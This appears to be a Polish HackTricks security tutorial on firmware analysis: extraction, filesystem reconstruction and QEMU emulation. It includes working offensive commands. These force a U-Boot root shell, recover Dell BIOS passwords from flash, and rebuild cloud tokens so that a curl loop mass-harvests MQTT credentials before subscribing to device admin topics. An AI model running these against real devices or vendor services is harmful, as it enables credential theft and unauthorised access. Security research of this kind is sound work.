# Analiza firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Wprowadzenie**

### Powiązane zasoby

Informacje na temat pozyskiwania danych z dostępnych interfejsów sprzętowych znajdziesz w sekcjach [UART console-assisted firmware dumping](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) i [SPI flash dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware to niezbędne oprogramowanie, które umożliwia prawidłowe działanie urządzeń, zarządzając komunikacją między komponentami sprzętowymi a oprogramowaniem, z którym użytkownicy wchodzą w interakcję. Jest przechowywane w pamięci trwałej, dzięki czemu urządzenie ma dostęp do niezbędnych instrukcji od momentu włączenia, co prowadzi do uruchomienia systemu operacyjnego. Analiza firmware i potencjalne jego modyfikowanie to kluczowe kroki w identyfikowaniu luk w zabezpieczeniach.<sup>[[2]](#references)[[3]](#references)</sup>

## **Gromadzenie informacji**

**Gromadzenie informacji** to kluczowy pierwszy krok w poznawaniu budowy urządzenia i wykorzystywanych w nim technologii. Proces ten obejmuje zbieranie danych na temat:

- Architektury CPU i uruchomionego na nim systemu operacyjnego
- Szczegółów dotyczących bootloadera
- Układu sprzętowego i dokumentacji technicznej
- Metryk bazy kodu i lokalizacji kodu źródłowego
- Zewnętrznych bibliotek i typów licencji
- Historii aktualizacji i certyfikatów zgodności z regulacjami
- Diagramów architektury i przepływu
- Ocen bezpieczeństwa i zidentyfikowanych luk

W tym celu nieocenione są narzędzia **open-source intelligence (OSINT)**, podobnie jak analiza wszelkich dostępnych komponentów open source przy użyciu ręcznych i zautomatyzowanych procesów weryfikacji. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) oferują bezpłatną analizę statyczną, która może pomóc w wykrywaniu potencjalnych problemów.

## **Pozyskiwanie firmware**

Firmware można pozyskać na różne sposoby, z których każdy wiąże się z innym poziomem trudności:

- **Bezpośrednio** ze źródła (od deweloperów lub producentów)
- **Budując** go na podstawie dostarczonych instrukcji
- **Pobierając** z oficjalnych stron pomocy technicznej
- Korzystając z zapytań **Google dork**, aby znaleźć udostępnione pliki firmware
- Uzyskując bezpośredni dostęp do **cloud storage**, za pomocą narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwytując **aktualizacje** za pomocą technik man-in-the-middle
- **Wyodrębniając** firmware z urządzenia przez połączenia takie jak **UART**, **JTAG** lub **PICit**
- **Nasłuchując** żądań aktualizacji w komunikacji urządzenia
- Identyfikując i wykorzystując **zakodowane na stałe endpointy aktualizacji**
- **Zrzucając** firmware z bootloadera lub przez sieć
- **Wyjmując i odczytując** układ pamięci, gdy wszystkie inne metody zawiodą, przy użyciu odpowiednich narzędzi sprzętowych

### Logi dostępne tylko przez UART: wymuszenie powłoki root za pomocą zmiennych środowiskowych U-Boot zapisanych we flashu

Jeśli UART RX jest ignorowany (dostępne są tylko logi), nadal można wymusić powłokę init, **edytując offline blob zmiennych środowiskowych U-Boot**:<sup>[[6]](#references)</sup>

1. Zrzuć zawartość SPI flash za pomocą klipsa SOIC-8 i programatora (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Zlokalizuj partycję środowiska U-Boot, edytuj `bootargs`, aby dodać `init=/bin/sh`, i **ponownie oblicz CRC32 środowiska U-Boot** dla bloba.
3. Zapisz ponownie tylko partycję środowiska i uruchom urządzenie ponownie; w UART powinien pojawić się shell.

Przydaje się to w przypadku urządzeń wbudowanych, w których shell bootloadera jest wyłączony, ale partycja środowiska jest zapisywalna przez zewnętrzny dostęp do pamięci flash.

## Analiza firmware

Skoro masz już **firmware**, musisz wyodrębnić z niego informacje, aby wiedzieć, jak z nim postępować. Możesz do tego użyć różnych narzędzi:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Jeśli za pomocą tych narzędzi niewiele znajdziesz, sprawdź **entropię** obrazu poleceniem `binwalk -E <bin>`. Niska entropia oznacza, że obraz raczej nie jest zaszyfrowany. Wysoka entropia oznacza, że prawdopodobnie jest zaszyfrowany (lub w jakiś sposób skompresowany).

Możesz też użyć tych narzędzi, aby wyodrębnić **pliki osadzone w firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Możesz też użyć [**binvis.io**](https://binvis.io/#/) ([kod](https://code.google.com/archive/p/binvis/)), aby sprawdzić plik.

### Różnicowa analiza flash i możliwe do odzyskania magazyny sekretów XOR

Gdy format przechowywania ustawienia firmware nie jest udokumentowany, najpierw wykonaj kilka odczytów tej samej pamięci flash, zmień **dokładnie jedno** ustawienie, ponownie zrzutuj cały układ i porównaj offsety. Powtarzanie eksperymentu z kontrolowanymi wartościami pozwala odróżnić zmienione ustawienie od liczników i metadanych zapisu; zmiany pod nowymi offsetami, a nie w miejscu, wskazują na magazyn dopisywany na końcu lub zorganizowany jako log. Zachowaj usunięte wpisy i wpisy oznaczone jako usunięte, ponieważ ich bajty danych mogą nadal nadawać się do odzyskania.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Po zlokalizowaniu regionu wyodrębnij moduły firmware'u za pomocą narzędzi takich jak `binwalk` i przeanalizuj w Ghidra wstecznie funkcje zapisującą/walidującą. Potwierdź w kodzie granice pól, padding, indeksowanie klucza i sposób jego wyprowadzania, zamiast wnioskować o schemacie wyłącznie na podstawie wzorców ciphertextu.<sup>[[12]](#references)</sup>

#### Odzyskiwanie kluczy z zaszyfrowanego paddingu zerami

Jak opisano w [szyfrowaniu opartym na XOR](../../crypto/symmetric/#xor-based-encryption), znany tekst jawny ujawnia bajty keystreamu na tych samych pozycjach. Stałej długości pole jest szczególnie podatne, gdy jego padding zerami obejmuje wszystkie indeksy powtarzającego się klucza XOR: zaszyfrowany padding ujawnia te bajty klucza bezpośrednio, ponieważ `0x00 XOR key_byte = key_byte`. Jeśli pokryte są wszystkie indeksy klucza, odtwórz klucz z końcówki ciphertextu i odszyfruj wypełnione bajty.<sup>[[12]](#references)</sup>

Podatny format hasła BIOS-u DVAR firmy Dell jest konkretnym przykładem: bajt `0` pola o długości 32 bajtów jest tekstem jawnym, natomiast bajty `1..31` są szyfrowane powtarzającym się kluczem o długości 20 bajtów.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Dla hasła o długości `L` pozycje `L..31` miały przed XOR wartość zero. Gdy `L <= 12`, pozycje te obejmują każdy indeks klucza, więc pełny klucz i hasło można odzyskać bez brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Pozyskiwanie kluczy z historycznych rekordów

Nie analizuj każdego rekordu niezależnie. Klucz DVAR jest wyprowadzany w przybliżeniu jako `modified_md5(device_seed || variable_GUID || password[0])`: seed urządzenia i GUID są stałe, a jedynym wejściem zależnym od hasła jest jawny pierwszy bajt. Daje to maksymalnie 256 kluczy na urządzenie, a rekordy zaczynające się od tego samego bajtu współdzielą klucz. Pogrupuj aktywne i usunięte rekordy według tego bajtu; krótki historyczny rekord może ujawnić cały klucz przez padding i umożliwić odszyfrowanie bieżącego, dłuższego rekordu, którego własny padding jest niewystarczający. Rotacja hasła może więc zwiększyć ryzyko, jeśli stary szyfrogram zostanie oznaczony jako usunięty, zamiast wymazany.<sup>[[12]](#references)</sup>

Narzędzie [`dellpwn`](https://github.com/R3n5k1/dellpwn) lokalizuje DVAR, weryfikuje kandydatów na rekordy, odzyskuje hasła i może wyświetlać surowe bajty zapisanych danych/klucza. Skompiluj je z pobranego repozytorium i przeskanuj zweryfikowany obraz pamięci flash w następujący sposób:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

W przypadku niestandardowych parserów odrzucaj fałszywe trafienia, sprawdzając strukturę rekordów, wymagania dotyczące drukowalnych znaków, dopełnienie zerami, entropię klucza oraz spójność w miejscu zawijania klucza. Jeśli powtarzane zrzuty pokazują nieliczne zmiany bitów przy każdym zapisie, wylicz zaobserwowane maski i uszereguj poprawki według tych kryteriów, ale zamiast przedstawiać wynik heurystyki jako dokładne odzyskanie danych, oznacz niejednoznaczne znaki.<sup>[[12]](#references)</sup>

Weryfikatory haseł powinny przechowywać solony, iterowany jednokierunkowy hash zamiast odwracalnego szyfrogramu, a magazyny o strukturze dziennika powinny bezpiecznie usuwać zastąpione dane tajne.<sup>[[12]](#references)</sup>

### Pobieranie systemu plików

Korzystając z wcześniej wspomnianych narzędzi, takich jak `binwalk -ev <bin>`, powinieneś móc **wyodrębnić system plików**.\
Binwalk zazwyczaj wyodrębnia go do **folderu nazwanego według typu systemu plików**, którym zwykle jest jeden z następujących: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ręczne wyodrębnianie systemu plików

Czasami binwalk **nie ma bajtu magicznego systemu plików w swoich sygnaturach**. W takich przypadkach użyj binwalk, aby **znaleźć przesunięcie systemu plików i wyciąć skompresowany system plików** z pliku binarnego, a następnie **ręcznie wyodrębnij** system plików zgodnie z jego typem, wykonując poniższe kroki.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Uruchom poniższe **polecenie dd**, aby wyodrębnić system plików Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatywnie można również uruchomić następujące polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Dla squashfs (używanego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Pliki znajdą się później w katalogu "`squashfs-root`".

- Pliki archiwów CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Dla systemów plików jffs2

`$ jefferson rootfsfile.jffs2`

- Dla systemów plików ubifs z pamięcią flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Odtwarzanie podzielonych systemów plików root w urządzeniach wbudowanych

Jeśli surowy zrzut eMMC/SSD zawiera prawidłowy nagłówek systemu plików, ale przesunięcia metadanych wykraczają poza nominalną partycję, nie klasyfikuj go od razu jako uszkodzonego. Kod rozruchowy urządzenia wbudowanego może złożyć rzeczywiste urządzenie root z wielu zakresów fizycznych za pomocą Device Mapper, dlatego wyodrębnienie jednej partycji GPT daje tylko pierwszy segment.<sup>[[9]](#references)</sup>

#### Wstępna analiza pełnego obrazu nośnika

Najpierw sprawdź, czy pozyskiwanie danych zostało zakończone, rozmiar jest stabilny i żaden proces nadal nie zapisuje do obrazu. Jeśli nazwa pliku zawiera adres początkowy/końcowy, porównaj ten zakres z rzeczywistą liczbą bajtów. Odzyskaj GPT w trybie tylko do odczytu i podłącz wyłącznie wymagany zakres; **nie** uruchamiaj `vgchange -ay` na niezaufanym woluminie fizycznym na stacji roboczej, ponieważ może to spowodować kolizje grup woluminów i niezamierzone zapisy.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Preferuj jednorazową maszynę wirtualną, gdy oryginalna logika init lub stos LVM musi mieć dostęp do całego obrazu. Historyczne logi rozruchu ze standardowej partycji rozruchowej są szczególnie przydatne: bootloader mógł zapisać offsety w zastrzeżonym kontenerze, długości komponentów, wybór slotu, reguły wyrównania i weryfikację podpisu. Użyj tych wartości, aby wyodrębnić wbudowaną linię poleceń, kernel i initramfs, a następnie niezależnie zweryfikuj każdy wynik za pomocą `file`, bajtów sygnatury i `binwalk`; odczyt do końca kontenera może przypadkowo dołączyć do kernela initrd, obiekt ACPI lub sygnaturę.<sup>[[9]](#references)</sup>

#### Odtwórz mapę bloków używaną podczas rozruchu

Wyodrębnij initramfs kernela i przeprowadź inżynierię wsteczną `/init` oraz bibliotek pamięci masowej. W [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) wyszukaj odwołania do ciągów `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` i ścieżek partycji, a następnie prześledź kod wybierający aktywny slot A/B i tworzący tabelę. Przydatne punkty wyjścia w radare2 to `r2 -A init`, `afl`, `pdf @ main` i `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Cel linear mapuje kolejne zakresy urządzenia wirtualnego na zakresy jednego lub większej liczby urządzeń bazowych. Odzyskana tabela z dwoma segmentami ma często następującą postać (wszystkie pozycje i długości podano w sektorach 512-bajtowych):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Odtwórz dokładnie arytmetykę kodu maszynowego, w tym szerokość liczby całkowitej, przesunięcia i konwersje jednostek. Na przykład poniższe wyrażenie obcina rozmiar wyrażony w bajtach do granicy 4 KiB, a dopiero potem konwertuje go na sektory 512-bajtowe; zastąpienie go przez `p4_bytes // 512` przesuwa wybrany obszar końcowy o `p4_bytes % 4096`, gdy partycja nie jest wyrównana do strony.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Odtwórz płaski obraz analizy, kopiując zakresy w kolejności z tabeli, w ograniczonych fragmentach zamiast wczytywać cały zrzut nośnika do pamięci. Pozwala to również uniknąć tworzenia urządzeń mappera po stronie hosta. Zachowaj offsety wyznaczone na podstawie GPT, odwrócone liczby sektorów i wynikową długość danych wyjściowych jako osobne asercje.<sup>[[9]](#references)</sup>

#### Odróżnianie uszkodzenia od stałego błędu rekonstrukcji

W przypadku SquashFS sprawdź sygnaturę `hsqs` i odczytaj 64-bitowe pole `bytes_used` w kolejności little-endian, znajdujące się pod offsetem 40 superbloku, przed uruchomieniem `unsquashfs`. Jeśli ekstrakcja nie powiedzie się w kilku niezwiązanych strukturach, przeszukaj szerokie okno wokół oczekiwanych pozycji i wymagaj mocnych przesłanek strukturalnych: dekompresowalnego bloku metadanych, kilku kolejnych prawidłowych wpisów katalogu, wiarygodnych pól inode, inode głównego zgodnego z liczbą inode’ów lub prawidłowej struktury metadanych integralności. Pojedyncze dopasowanie sygnatury nie wystarczy.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Gdy ta sama delta ze znakiem sprawia, że niezależne struktury stają się poprawne — na przykład metadane katalogu i rekord verity — prawdopodobną przyczyną jest systematyczny błąd początku segmentu, a nie brakujące bajty. Wróć do odwróconych obliczeń i sprawdź, czy odrzucono reszty, wystąpił problem ze znakiem lub przepełnieniem albo zaokrąglaniem do granic sektora/strony, zanim spróbujesz odzyskiwać osierocone dane lub modyfikować metadane systemu plików.<sup>[[9]](#references)</sup>

Na koniec rozróżniaj granice ochrony: woluminy LUKS z kluczem zapieczętowanym w TPM chronią poufność danych, natomiast podpisane mapowanie dm-verity chroni integralność głównego systemu plików. Programowy TPM nie odzyska klucza zapieczętowanego w oryginalnym fizycznym TPM, a uruchomienie zmodyfikowanego SquashFS za pomocą initu przeznaczonego wyłącznie do badań, który pomija weryfikację verity, nie fałszuje jego podpisu ani nie łamie dm-verity.<sup>[[9]](#references)</sup>

## Analiza firmware

Po uzyskaniu firmware należy go dokładnie przeanalizować, aby zrozumieć jego strukturę i potencjalne podatności. Proces ten obejmuje użycie różnych narzędzi do analizy i wyodrębnienia cennych danych z obrazu firmware.

### Narzędzia do wstępnej analizy

Poniżej przedstawiono zestaw poleceń do wstępnego sprawdzenia pliku binarnego (oznaczonego jako `<bin>`). Polecenia te pomagają określić typ pliku, wyodrębnić ciągi znaków, przeanalizować dane binarne oraz poznać szczegóły partycji i systemu plików:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Aby ocenić stan szyfrowania obrazu, sprawdza się **entropię** za pomocą `binwalk -E <bin>`. Niska entropia sugeruje brak szyfrowania, natomiast wysoka może wskazywać na szyfrowanie lub kompresję.

Do wyodrębniania **osadzonych plików** zalecane są narzędzia i zasoby takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie systemu plików

Za pomocą `binwalk -ev <bin>` można zwykle wyodrębnić system plików, często do katalogu o nazwie odpowiadającej jego typowi (np. squashfs, ubifs). Jeśli jednak **binwalk** nie rozpoznaje typu systemu plików z powodu braku magic bytes, konieczne jest ręczne wyodrębnienie. Polega ono na użyciu `binwalk` do ustalenia offsetu systemu plików, a następnie polecenia `dd`, aby wyodrębnić system plików:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Następnie, w zależności od typu systemu plików (np. squashfs, cpio, jffs2, ubifs), używa się różnych poleceń do ręcznego wyodrębniania zawartości.

### Analiza systemu plików

Po wyodrębnieniu systemu plików rozpoczyna się poszukiwanie luk w zabezpieczeniach. Zwraca się uwagę na niezabezpieczone demony sieciowe, zakodowane na stałe dane uwierzytelniające, endpointy API, funkcje serwerów aktualizacji, nieprzetłumaczony kod, skrypty startowe oraz skompilowane pliki binarne przeznaczone do analizy offline.

**Kluczowe lokalizacje** i **elementy** do sprawdzenia:

- **etc/shadow** i **etc/passwd** w poszukiwaniu danych uwierzytelniających użytkowników
- Certyfikaty SSL i klucze w **etc/ssl**
- Pliki konfiguracyjne i skrypty pod kątem potencjalnych luk
- Osadzone pliki binarne do dalszej analizy
- Typowe serwery WWW i pliki binarne urządzeń IoT

Kilka narzędzi pomaga znaleźć poufne informacje i luki w systemie plików:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania poufnych informacji
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej analizy firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej

### Kontrole bezpieczeństwa skompilowanych plików binarnych

Zarówno kod źródłowy, jak i skompilowane pliki binarne znalezione w systemie plików należy dokładnie sprawdzić pod kątem luk. Narzędzia takie jak **checksec.sh** dla plików binarnych Unix i **PESecurity** dla plików binarnych Windows pomagają wykrywać niezabezpieczone pliki binarne, które można wykorzystać.

## Pozyskiwanie konfiguracji chmurowej i danych uwierzytelniających MQTT za pomocą tokenów URL wyliczanych lokalnie

Wiele hubów IoT pobiera konfigurację dla poszczególnych urządzeń z endpointu chmurowego o postaci:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Podczas analizy firmware można odkryć, że `<token>` jest lokalnie wyliczany na podstawie identyfikatora urządzenia przy użyciu zakodowanego na stałe sekretu, na przykład:

- token = MD5( deviceId || STATIC_KEY ) i jest zapisany jako wielkie litery w formacie szesnastkowym

Taka konstrukcja pozwala każdemu, kto pozna deviceId i STATIC_KEY, odtworzyć URL i pobrać konfigurację chmurową, w której często znajdują się jawne dane uwierzytelniające MQTT i prefiksy tematów.

Praktyczny przebieg pracy:

1) Wyodrębnij deviceId z logów rozruchowych UART

- Podłącz adapter UART 3,3 V (TX/RX/GND) i przechwyć logi:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Wyszukaj wiersze wypisujące wzorzec adresu URL konfiguracji chmurowej i adres brokera, na przykład:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Odzyskaj STATIC_KEY i algorytm tokenu z firmware

- Załaduj pliki binarne do Ghidra/radare2 i wyszukaj ścieżkę konfiguracji ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- Wygeneruj token w Bashu i zamień digest na wielkie litery:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Pozyskaj konfigurację chmurową i dane uwierzytelniające MQTT

- Złóż URL i pobierz JSON za pomocą curl; użyj jq, aby wyodrębnić sekrety:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Nadużywaj MQTT przesyłanego jawnym tekstem i słabych ACL-i tematów (jeśli występują)

- Użyj odzyskanych danych uwierzytelniających, aby zasubskrybować tematy konserwacyjne i szukać poufnych zdarzeń:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Wylicz przewidywalne identyfikatory urządzeń (na dużą skalę, za zgodą)

- Wiele ekosystemów umieszcza bajty OUI/produktu/typu dostawcy, po których następuje sekwencyjny sufiks.
- Możesz iterować po kandydujących identyfikatorach, programowo wyprowadzać tokeny i pobierać konfiguracje:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notatki
- Zawsze uzyskaj wyraźną zgodę przed podjęciem próby masowej enumeracji.
- Jeśli to możliwe, odzyskuj sekrety za pomocą emulacji lub analizy statycznej, nie modyfikując sprzętu docelowego.


Proces emulacji firmware'u umożliwia **analizę dynamiczną** działania urządzenia lub pojedynczego programu. Podejście to może wiązać się z problemami zależnymi od sprzętu lub architektury, ale przeniesienie głównego systemu plików lub określonych plików binarnych na urządzenie o zgodnej architekturze i kolejności bajtów, takie jak Raspberry Pi, albo do gotowej maszyny wirtualnej może ułatwić dalsze testy.

### Emulowanie pojedynczych plików binarnych

Aby zbadać pojedyncze programy, należy określić kolejność bajtów i architekturę procesora programu.

#### Przykład z architekturą MIPS

Do emulacji pliku binarnego dla architektury MIPS można użyć polecenia:

```bash
file ./squashfs-root/bin/busybox
```

Oraz aby zainstalować niezbędne narzędzia do emulacji:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

W przypadku MIPS (big-endian) używa się `qemu-mips`, a dla binariów little-endian odpowiednim wyborem będzie `qemu-mipsel`.

#### Emulacja architektury ARM

W przypadku binariów ARM proces jest podobny — do emulacji używa się emulatora `qemu-arm`.

### Pełna emulacja systemu

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne ułatwiają pełną emulację firmware'u, automatyzując ten proces i wspomagając analizę dynamiczną.

### Odtwarzanie podzielonych i weryfikowanych systemów plików root do emulacji

Jeśli superblok SquashFS jest czytelny, ale przesunięcia i-węzłów, katalogów lub tabeli fragmentów są niemożliwe do ustalenia, nie modyfikuj od razu `unsquashfs`. Przeanalizuj binarium wczesnego rozruchu i odtwórz tworzony przez nie graf urządzeń blokowych: systemy wbudowane mogą udostępniać pozorną partycję root, ale tworzyć właściwy system plików za pomocą mapowania `dm-linear`, które dołącza sektory pożyczone z innej partycji. Kontrole obejmujące wyłącznie superblok mogą się powieść, nawet jeśli wszystkie późniejsze bloki metadanych są przesunięte.<sup>[[11]](#references)</sup>

Odtwórz dokładnie operacje arytmetyczne wykonywane przez firmware. Ustal zwłaszcza, czy długości są podawane w bajtach, sektorach 512-bajtowych czy stronach 4 KiB; zachowaj kolejność przesunięć bitowych i obcinania; uwzględnij też zależne od banku obszary końcowe w układach A/B. Na przykład `(partition_bytes >> 12) << 3` najpierw obcina wartość do granicy 4 KiB, a dopiero potem wyraża wynik w sektorach 512-bajtowych. Zastąpienie tego wyrażeniem `partition_bytes // 512` może przesunąć dołączany obszar o kilka kilobajtów i uszkodzić wszystkie dalsze tabele SquashFS.<sup>[[11]](#references)</sup>

Przydatny proces walidacji:<sup>[[11]](#references)</sup>

1. Odtwórz z binarium weryfikatora/init urządzenie źródłowe, sektor początkowy i długość każdego segmentu `dm-linear`.
2. Połącz zakresy lub zamapuj je, nie zmieniając zasad wyrównania.
3. Jeśli ekstrakcja nadal się nie powiedzie, przeszukaj tylko niewielki obszar wokół przewidywanej granicy i wymagaj kilku kolejnych poprawnych struktur metadanych, zamiast akceptować sam wiarygodnie wyglądający superblok.
4. Uruchom niezmodyfikowane `unsquashfs` na odtworzonym obrazie; poprawne przejście przez wszystkie katalogi i fragmenty jest mocniejszym dowodem niż wynik `unsquashfs -stat`.

#### Zastąpienie dm-verity w środowisku kontrolowanym przez analityka

Gdy analityk kontroluje jądro QEMU, initramfs i dyski wirtualne, zmodyfikowany system root można uruchomić, zastępując weryfikujący proces PID 1 dostawcy niewielkim, statycznie linkowanym init. Jest to **zastąpienie łańcucha rozruchowego w laboratorium**, a nie złamanie dm-verity, jego podpisu RSA, Secure Boot ani klucza zapieczętowanego w TPM.<sup>[[11]](#references)</sup>

Zastępczy init powinien odwzorowywać operacyjne elementy oryginalnej ścieżki rozruchu: zamontować `devtmpfs`, wywołać `setsid()`, podłączyć `/dev/console` do deskryptorów plików 0–2, zamontować `/proc` i `/sys`, zaczekać na dostarczone urządzenie blokowe, zamontować zmodyfikowany system root tylko do odczytu, odłączyć pseudo-systemy plików starego systemu root, przenieść nowe montowanie na `/`, wykonać `chroot` i `execve()` oryginalnego `/sbin/init` firmware'u. Odłączenie `/dev`, `/proc` i `/sys` **przed** `MS_MOVE` zapobiega przypadkowemu odłączeniu punktów montowania należących do nowego systemu root.<sup>[[11]](#references)</sup>

Oddziel zmienny stan urządzenia od zmodyfikowanego, niezmiennego systemu root. Nakładka qcow2 może zachować stan LVM oryginalnego dysku, podczas gdy drugi dysk virtio zamontowany tylko do odczytu udostępnia zmodyfikowany SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Debugowanie stanu obrazu offline

Sprawdź trwały stan poza maszyną guest, gdy powolne uruchamianie, destrukcyjne skrypty startowe lub zawodne logowanie konsoli utrudniają ustalenie przyczyny awarii. Nigdy nie podłączaj overlay używanego przez działającą maszynę wirtualną; udostępnij go za pomocą `qemu-nbd`, ogranicz wykrywanie LVM do przeznaczonej partycji NBD i dezaktywuj grupę woluminów przed jej odłączeniem.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

